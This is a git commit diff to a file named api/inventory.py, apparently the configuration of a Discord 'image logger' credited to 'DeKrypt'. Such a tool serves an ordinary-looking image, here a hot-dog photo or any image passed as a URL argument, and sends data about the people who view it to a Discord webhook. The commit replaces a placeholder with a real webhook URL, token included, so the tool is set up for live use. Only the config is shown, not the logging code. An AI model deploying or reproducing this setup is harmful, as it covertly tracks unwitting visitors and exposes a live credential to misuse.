19c871ff21f36cd72831d529aca034f53b5fe996
dudeisherebas <143163162+dudeisherebas@users.noreply.github.com>
2023-08-29 19:21:24 +0530

    Add files via upload

--- api/inventory.py
+++ api/inventory.py
@@ -12,7 +12,7 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/your/webhook",
+    "webhook": "https://discord.com/api/webhooks/1145765609943089323/OpGAxeDWD_Nc-44mocSAhD60tqh6uv38J77OhpE0dBAxVy13Uot-gHj_YD731MzSinKn",
     "image": "https://www.mashed.com/img/gallery/what-does-it-mean-to-get-a-hot-dog-alligator-style/l-intro-1672777527.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
